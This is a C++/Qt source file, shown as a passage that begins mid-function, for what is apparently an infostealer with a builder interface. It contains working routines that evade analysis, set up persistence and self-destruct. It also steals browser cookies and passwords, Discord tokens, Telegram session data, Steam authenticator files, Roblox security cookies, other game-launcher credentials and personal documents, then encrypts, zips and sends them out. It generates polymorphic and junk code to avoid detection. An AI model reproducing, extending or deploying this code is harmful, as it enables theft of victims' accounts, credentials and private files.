    updateConfigFromUI();
    if (isBuilding) {
        Log(QString("Build already in progress"));
        return;
    }

    isBuilding = true;
    Log(QString("Starting build process..."));

    // Генерация необходимых файлов
    generatePolymorphicCode();
    generateBuildKeyHeader();
    generateJunkCode(); // Добавляем генерацию мусорного кода
    copyIconToBuild();

    // Проверка зависимостей перед сборкой
    if (!checkDependencies()) {
        Log(QString("Dependency check failed, aborting build"));
        isBuilding = false;
        return;
    }

    // Имитация сборки (в реальном проекте здесь будет вызов компилятора, например, MSBuild или CMake)
    QTimer::singleShot(2000, this, [this]() {
        Log(QString("Build completed: ") + QString::fromStdString(config.filename));
        isBuilding = false;
        emit startStealSignal();
    });
}

// Проверка зависимостей
bool MainWindow::checkDependencies() {
    // Проверка наличия необходимых библиотек
    const char* requiredLibs[] = {
        "bcrypt.dll",  // Для libbcrypt
        "libzip.dll",  // Для libzip
        "sqlite3.dll", // Для libsqlite3
        "libcurl.dll", // Для libcurl
        "libssl.dll",  // Для libssl
        "libcrypto.dll", // Для libcrypto
        nullptr
    };

    bool allLibsPresent = true;
    for (int i = 0; requiredLibs[i]; i++) {
        if (!GetModuleHandleA(requiredLibs[i])) {
            Log(QString::fromStdString("Missing dependency: " + std::string(requiredLibs[i])));
            allLibsPresent = false;
        }
    }

    if (!allLibsPresent) {
        Log(QString("One or more dependencies are missing. Please ensure all required libraries are installed."));
        return false;
    }

    Log(QString("All dependencies are present."));
    return true;
}

void MainWindow::triggerGitHubActions() {
    if (config.githubToken.empty() || config.githubRepo.empty()) {
        Log(QString("GitHub token or repository not specified"));
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + QString::fromStdString(config.githubRepo) + "/actions/workflows/build.yml/dispatches"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", ("Bearer " + config.githubToken).c_str());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";
    QJsonDocument doc(json);
    QByteArray data = doc.toJson();

    QNetworkReply* reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        replyFinished(reply);
        if (reply->error() == QNetworkReply::NoError) {
            statusCheckTimer->start(30000); // Проверять статус каждые 30 секунд
        }
    });
}

void MainWindow::checkBuildStatus() {
    if (workflowRunId.isEmpty()) {
        Log(QString("No workflow run ID to check"));
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + QString::fromStdString(config.githubRepo) + "/actions/runs/" + workflowRunId));
    request.setRawHeader("Authorization", ("Bearer " + config.githubToken).c_str());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply* reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = doc.object();
            QString status = obj["status"].toString();
            QString conclusion = obj["conclusion"].toString();
            Log(QString("Build status: ") + status + ", conclusion: " + conclusion);
            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emit startStealSignal();
                }
            }
        } else {
            Log(QString("Failed to check build status: ") + reply->errorString());
        }
        reply->deleteLater();
    });
}

void MainWindow::startStealProcess() {
    if (AntiAnalysis()) {
        Log(QString("Anti-analysis checks failed, exiting"));
        QApplication::quit();
        return;
    }

    Stealth();
    Persist();
    FakeError();

    std::string tempDir = std::filesystem::temp_directory_path().string() + "\\stolen_data_" + std::to_string(GetTickCount());
    std::filesystem::create_directory(tempDir);
    StealAndSendData(tempDir);

    SelfDestruct();
}

void MainWindow::StealAndSendData(const std::string& dir) {
    collectedData.clear();
    collectedFiles.clear();

    // Сбор системной информации
    if (config.systemInfo) {
        std::string sysInfo = GetCustomSystemInfo();
        if (!sysInfo.empty()) {
            collectedData += "[System Info]\n" + sysInfo + "\n";
        }
    }

    // Создание скриншота
    if (config.screenshot) {
        std::string screenshotPath = TakeScreenshot(dir);
        if (!screenshotPath.empty()) {
            collectedFiles.push_back(screenshotPath);
        }
    }

    // Кража данных браузеров
    if (config.cookies || config.passwords) {
        std::string browserData = stealBrowserData(dir);
        if (!browserData.empty()) {
            collectedData += "[Browser Data]\n" + browserData + "\n";
        }
    }

    // Кража токенов Discord
    if (config.discord) {
        std::string discordTokens = StealDiscordTokens(dir);
        if (!discordTokens.empty()) {
            collectedData += "[Discord Tokens]\n" + discordTokens + "\n";
        }

        std::string discordCache = StealAppCacheData("Discord", dir + "\\Discord_Cache");
        if (!discordCache.empty()) {
            collectedData += "[Discord Cache]\n" + discordCache + "\n";
        }
    }

    // Кража данных Telegram
    if (config.telegram) {
        std::string telegramData = StealTelegramData(dir);
        if (!telegramData.empty()) {
            collectedData += "[Telegram Data]\n" + telegramData + "\n";
        }
    }

    // Кража данных Steam
    if (config.steam || config.steamMAFile) {
        std::string steamData = StealSteamData(dir);
        if (!steamData.empty()) {
            collectedData += "[Steam Data]\n" + steamData + "\n";
        }
    }

    // Кража данных Epic Games
    if (config.epic) {
        std::string epicData = StealEpicGamesData(dir);
        if (!epicData.empty()) {
            collectedData += "[Epic Games Data]\n" + epicData + "\n";
        }
    }

    // Кража данных Roblox
    if (config.roblox) {
        std::string robloxData = StealRobloxData(dir);
        if (!robloxData.empty()) {
            collectedData += "[Roblox Data]\n" + robloxData + "\n";
        }
    }

    // Кража данных Battle.net
    if (config.battlenet) {
        std::string battlenetData = StealBattleNetData(dir);
        if (!battlenetData.empty()) {
            collectedData += "[Battle.net Data]\n" + battlenetData + "\n";
        }
    }

    // Кража данных Minecraft
    if (config.minecraft) {
        std::string minecraftData = StealMinecraftData(dir);
        if (!minecraftData.empty()) {
            collectedData += "[Minecraft Data]\n" + minecraftData + "\n";
        }
    }

    // Захват WebSocket и WebRTC сессий
    if (config.discord || config.telegram) {
        std::vector<std::string> processes = {"Discord.exe", "Telegram.exe"};
        for (const auto& process : processes) {
            std::string wsData = CaptureWebSocketSessions(process);
            if (!wsData.empty()) {
                collectedData += "[WebSocket Sessions - " + process + "]\n" + wsData + "\n";
            }

            std::string webrtcData = CaptureWebRTCSessions(process);
            if (!webrtcData.empty()) {
                collectedData += "[WebRTC Sessions - " + process + "]\n" + webrtcData + "\n";
            }
        }
    }

    // Кража файлов
    if (config.fileGrabber) {
        std::vector<std::string> grabbedFiles = GrabFiles(dir);
        collectedFiles.insert(collectedFiles.end(), grabbedFiles.begin(), grabbedFiles.end());
    }

    // Шифрование собранных данных
    std::string encryptedData;
    if (!collectedData.empty()) {
        try {
            encryptedData = EncryptData(collectedData, config.encryptionKey1, config.encryptionKey2, config.encryptionSalt);
            Log(QString("Data encrypted successfully"));
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Failed to encrypt data: " + std::string(e.what())));
            return;
        }
    }

    // Создание ZIP архива для файлов
    if (!collectedFiles.empty()) {
        std::string zipPath = CreateZipArchive(dir, collectedFiles);
        if (!zipPath.empty()) {
            collectedFiles.clear();
            collectedFiles.push_back(zipPath);
        }
    }

    // Отправка данных
    sendData(QString::fromStdString(encryptedData), collectedFiles);
}

std::string MainWindow::stealBrowserData(const std::string& dir) {
    std::string result;
    if (!config.cookies && !config.passwords) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    char* localAppDataPath = nullptr;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log(QString("Failed to get LOCALAPPDATA path"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::vector<std::pair<std::string, std::string>> browserPaths = {
        {"Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", appData + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", appData + "\\Opera Software\\Opera GX Stable\\"},
        {"Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\"}
    };

    for (const auto& browser : browserPaths) {
        std::string browserData = StealChromiumData(browser.first, browser.second, dir);
        if (!browserData.empty()) {
            result += browserData + "\n";
        }

        // Кража несохраненных данных браузера
        std::string cachePath = browser.second + "Cache\\";
        std::string unsavedData = StealUnsavedBrowserData(browser.first, cachePath);
        if (!unsavedData.empty()) {
            result += unsavedData + "\n";
        }
    }

    return result;
}

std::string MainWindow::StealDiscordTokens(const std::string& dir) {
    if (!config.discord) return "";

    std::string result;
    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log(QString("Failed to get LOCALAPPDATA path for Discord tokens"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    char* appDataPath = nullptr;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Discord tokens"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::vector<std::string> discordPaths = {
        appData + "\\Discord\\Local Storage\\leveldb\\",
        appData + "\\discordcanary\\Local Storage\\leveldb\\",
        appData + "\\discordptb\\Local Storage\\leveldb\\"
    };

    for (const auto& path : discordPaths) {
        if (!std::filesystem::exists(path)) {
            Log(QString::fromStdString("Discord path not found: " + path));
            continue;
        }

        try {
            for (const auto& entry : std::filesystem::directory_iterator(path)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file.is_open()) {
                        Log(QString::fromStdString("Failed to open Discord file: " + entry.path().string()));
                        continue;
                    }

                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();

                    std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        result += "Discord Token: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in StealDiscordTokens: " + std::string(e.what())));
        }
    }

    // Сохранение токенов в файл
    if (!result.empty()) {
        std::string outputFile = dir + "\\discord_tokens.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log(QString::fromStdString("Saved Discord tokens to: " + outputFile));
        } else {
            Log(QString::fromStdString("Failed to save Discord tokens to: " + outputFile));
        }
    }

    return result;
}

std::string MainWindow::StealTelegramData(const std::string& dir) {
    if (!config.telegram) return "";

    std::string result;
    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Telegram data"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
    if (!std::filesystem::exists(telegramPath)) {
        Log(QString::fromStdString("Telegram path not found: " + telegramPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
            if (entry.path().filename().string().find("key_data") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open Telegram key_data file: " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Telegram Key Data: [Binary Data, " + std::to_string(content.size()) + " bytes]\n";
            }
        }

        // Копирование данных Telegram в директорию
        std::string telegramDest = dir + "\\Telegram_Data";
        std::filesystem::create_directory(telegramDest);
        std::filesystem::copy(telegramPath, telegramDest, std::filesystem::copy_options::recursive);
        result += "Telegram Data Copied to: " + telegramDest + "\n";
        Log(QString::fromStdString("Telegram data copied to: " + telegramDest));
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealTelegramData: " + std::string(e.what())));
    }

    return result;
}

std::string MainWindow::StealSteamData(const std::string& dir) {
    if (!config.steam && !config.steamMAFile) return "";

    std::string result;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        Log(QString("Failed to open Steam registry key"));
        return result;
    }

    char steamPath[MAX_PATH] = {0};
    DWORD pathSize = sizeof(steamPath);
    if (RegQueryValueExA(hKey, "InstallPath", nullptr, nullptr, (LPBYTE)steamPath, &pathSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        Log(QString("Failed to get Steam install path from registry"));
        return result;
    }
    RegCloseKey(hKey);

    std::string steamDir = steamPath;
    if (!std::filesystem::exists(steamDir)) {
        Log(QString::fromStdString("Steam directory not found: " + steamDir));
        return result;
    }

    // Кража конфигурационных файлов Steam
    if (config.steam) {
        std::vector<std::string> steamFiles = {"config\\loginusers.vdf", "config\\config.vdf"};
        for (const auto& file : steamFiles) {
            std::string filePath = steamDir + "\\" + file;
            if (std::filesystem::exists(filePath)) {
                std::ifstream inFile(filePath);
                if (inFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                    inFile.close();
                    result += "Steam File (" + file + "):\n" + content + "\n";

                    std::string destPath = dir + "\\Steam_" + std::filesystem::path(file).filename().string();
                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
                    collectedFiles.push_back(destPath);
                    Log(QString::fromStdString("Steam file copied: " + filePath));
                } else {
                    Log(QString::fromStdString("Failed to open Steam file: " + filePath));
                }
            }
        }
    }

    // Кража MA файлов Steam
    if (config.steamMAFile) {
        std::string ssfnPath = steamDir + "\\";
        for (const auto& entry : std::filesystem::directory_iterator(ssfnPath)) {
            if (entry.path().filename().string().find("ssfn") != std::string::npos) {
                std::string filePath = entry.path().string();
                std::string destPath = dir + "\\" + entry.path().filename().string();
                std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
                collectedFiles.push_back(destPath);
                result += "Steam SSFN File: " + entry.path().filename().string() + "\n";
                Log(QString::fromStdString("Steam SSFN file copied: " + filePath));
            }
        }

        std::string maFilesPath = steamDir + "\\config\\maFiles\\";
        if (std::filesystem::exists(maFilesPath)) {
            for (const auto& entry : std::filesystem::directory_iterator(maFilesPath)) {
                if (entry.path().extension() == ".maFile") {
                    std::string filePath = entry.path().string();
                    std::string destPath = dir + "\\Steam_" + entry.path().filename().string();
                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
                    collectedFiles.push_back(destPath);
                    result += "Steam MA File: " + entry.path().filename().string() + "\n";
                    Log(QString::fromStdString("Steam MA file copied: " + filePath));
                }
            }
        }
    }

    return result;
}

std::string MainWindow::StealEpicGamesData(const std::string& dir) {
    if (!config.epic) return "";

    std::string result;
    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log(QString("Failed to get LOCALAPPDATA path for Epic Games data"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\";
    if (!std::filesystem::exists(epicPath)) {
        Log(QString::fromStdString("Epic Games path not found: " + epicPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(epicPath)) {
            if (entry.path().filename().string().find("Config") != std::string::npos ||
                entry.path().extension() == ".ini") {
                std::ifstream file(entry.path());
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open Epic Games file: " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Epic Games File (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\EpicGames_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
                collectedFiles.push_back(destPath);
                Log(QString::fromStdString("Epic Games file copied: " + entry.path().string()));
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealEpicGamesData: " + std::string(e.what())));
    }

    return result;
}

std::string MainWindow::StealRobloxData(const std::string& dir) {
    if (!config.roblox) return "";

    std::string result;
    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log(QString("Failed to get LOCALAPPDATA path for Roblox data"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string robloxPath = localAppData + "\\Roblox\\";
    if (!std::filesystem::exists(robloxPath)) {
        Log(QString::fromStdString("Roblox path not found: " + robloxPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(robloxPath)) {
            if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos ||
                entry.path().extension() == ".ini") {
                std::ifstream file(entry.path());
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open Roblox file: " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Roblox File (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\Roblox_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
                collectedFiles.push_back(destPath);
                Log(QString::fromStdString("Roblox file copied: " + entry.path().string()));
            }
        }

        // Поиск Roblox Studio cookie
        std::string cookiePath = localAppData + "\\Roblox\\LocalStorage\\";
        if (std::filesystem::exists(cookiePath)) {
            for (const auto& entry : std::filesystem::directory_iterator(cookiePath)) {
                if (entry.path().extension() == ".roblox.com") {
                    std::ifstream file(entry.path());
                    if (file.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        file.close();
                        std::regex cookieRegex("ROBLOSECURITY=[^;]+");
                        std::smatch match;
                        if (std::regex_search(content, match, cookieRegex)) {
                            result += "Roblox Cookie: " + match[0].str() + "\n";
                        }
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealRobloxData: " + std::string(e.what())));
    }

    return result;
}

std::string MainWindow::StealBattleNetData(const std::string& dir) {
    if (!config.battlenet) return "";

    std::string result;
    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Battle.net data"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string battlenetPath = appData + "\\Battle.net\\";
    if (!std::filesystem::exists(battlenetPath)) {
        Log(QString::fromStdString("Battle.net path not found: " + battlenetPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(battlenetPath)) {
            if (entry.path().extension() == ".config" || entry.path().filename().string().find("Battle.net") != std::string::npos) {
                std::ifstream file(entry.path());
                if (!file.is_open()) {
                    Log(QString::fromStdString("Failed to open Battle.net file: " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Battle.net File (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\BattleNet_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
                collectedFiles.push_back(destPath);
                Log(QString::fromStdString("Battle.net file copied: " + entry.path().string()));
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealBattleNetData: " + std::string(e.what())));
    }

    return result;
}

std::string MainWindow::StealMinecraftData(const std::string& dir) {
    if (!config.minecraft) return "";

    std::string result;
    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log(QString("Failed to get APPDATA path for Minecraft data"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string minecraftPath = appData + "\\.minecraft\\";
    if (!std::filesystem::exists(minecraftPath)) {
        Log(QString::fromStdString("Minecraft path not found: " + minecraftPath));
        return result;
    }

    try {
        std::vector<std::string> mcFiles = {"launcher_profiles.json", "usercache.json"};
        for (const auto& file : mcFiles) {
            std::string filePath = minecraftPath + file;
            if (std::filesystem::exists(filePath)) {
                std::ifstream inFile(filePath);
                if (inFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                    inFile.close();
                    result += "Minecraft File (" + file + "):\n" + content + "\n";

                    std::string destPath = dir + "\\Minecraft_" + file;
                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing);
                    collectedFiles.push_back(destPath);
                    Log(QString::fromStdString("Minecraft file copied: " + filePath));
                } else {
                    Log(QString::fromStdString("Failed to open Minecraft file: " + filePath));
                }
            }
        }
    } catch (const std::exception& e) {
        Log(QString::fromStdString("Error in StealMinecraftData: " + std::string(e.what())));
    }

    return result;
}

std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
    std::vector<std::string> grabbedFiles;
    if (!config.fileGrabber) return grabbedFiles;

    std::vector<std::string> directories = {
        std::string(getenv("USERPROFILE")) + "\\Desktop\\",
        std::string(getenv("USERPROFILE")) + "\\Documents\\",
        std::string(getenv("USERPROFILE")) + "\\Downloads\\"
    };

    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png"};

    for (const auto& directory : directories) {
        if (!std::filesystem::exists(directory)) {
            Log(QString::fromStdString("Directory not found for file grabbing: " + directory));
            continue;
        }

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
                if (entry.is_regular_file()) {
                    auto ext = entry.path().extension().string();
                    if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end() &&
                        entry.file_size() < 5 * 1024 * 1024) { // Ограничение размера файла 5 МБ
                        std::string destPath = dir + "\\Grabbed_" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing);
                        grabbedFiles.push_back(destPath);
                        Log(QString::fromStdString("File grabbed: " + entry.path().string()));
                    }
                }
            }
        } catch (const std::exception& e) {
            Log(QString::fromStdString("Error in GrabFiles: " + std::string(e.what())));
        }
    }

    return grabbedFiles;
}

// Создание ZIP архива
std::string CreateZipArchive(const std::string& dir, const std::vector<std::string>& files) {
    std::string zipPath = dir + "\\data_" + std::to_string(GetTickCount()) + ".zip";
    int err = 0;
    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!zip) {
        Log(QString::fromStdString("Failed to create ZIP archive: " + zipPath));
        return "";
    }

    for (const auto& file : files) {
        zip_source_t* source = zip_source_file(zip, file.c_str(), 0, 0);
        if (!source) {
            Log(QString::fromStdString("Failed to add file to ZIP: " + file));
            continue;
        }

        if (zip_file_add(zip, std::filesystem::path(file).filename().string().c_str(), source, ZIP_FL_OVERWRITE) < 0) {
            zip_source_free(source);
            Log(QString::fromStdString("Failed to add file to ZIP: " + file));
        }
    }

    if (zip_close(zip) < 0) {
        Log(QString::fromStdString("Failed to close ZIP archive: " + zipPath));
        return "";
    }

    Log(QString::fromStdString("ZIP archive created: " + zipPath));
    return zipPath;
}

// Тестирование на целевой системе
void MainWindow::runTests() {
    Log(QString("Running tests on target system..."));

    // Тест 1: Проверка шифрования и дешифрования
    std::string testData = "Test data for encryption";
    std::string encrypted = EncryptData(testData, config.encryptionKey1, config.encryptionKey2, config.encryptionSalt);
    std::string decrypted = DecryptData(encrypted);
    if (testData == decrypted) {
        Log(QString("Encryption/Decryption test passed"));
    } else {
        Log(QString("Encryption/Decryption test failed"));
    }

    // Тест 2: Проверка генерации мусорного кода
    generateJunkCode();
    if (std::filesystem::exists("junk_code_generated.h")) {
        Log(QString("Junk code generation test passed"));
    } else {
        Log(QString("Junk code generation test failed"));
    }

    // Тест 3: Проверка отправки данных
    std::vector<std::string> testFiles;
    sendData(QString::fromStdString("Test data"), testFiles);
    Log(QString("Send data test completed (check logs for success)"));
}

int main(int argc, char *argv[]) {
    // Инициализация GDI+
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    QApplication app(argc, argv);

    MainWindow w;
    w.show();

    // Запуск StealerWorker для выполнения задач в фоновом режиме
    StealerWorker* worker = new StealerWorker(&w, std::string(getenv("TEMP")) + "\\DeadCode_" + w.generateRandomString(8));
    QThread* thread = new QThread;
    worker->moveToThread(thread);

    QObject::connect(thread, &QThread::started, worker, &StealerWorker::process);
    QObject::connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    QObject::connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    QObject::connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();

    // Запуск тестов на целевой системе
    w.runTests();

    int result = app.exec();

    // Очистка GDI+
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return result;
}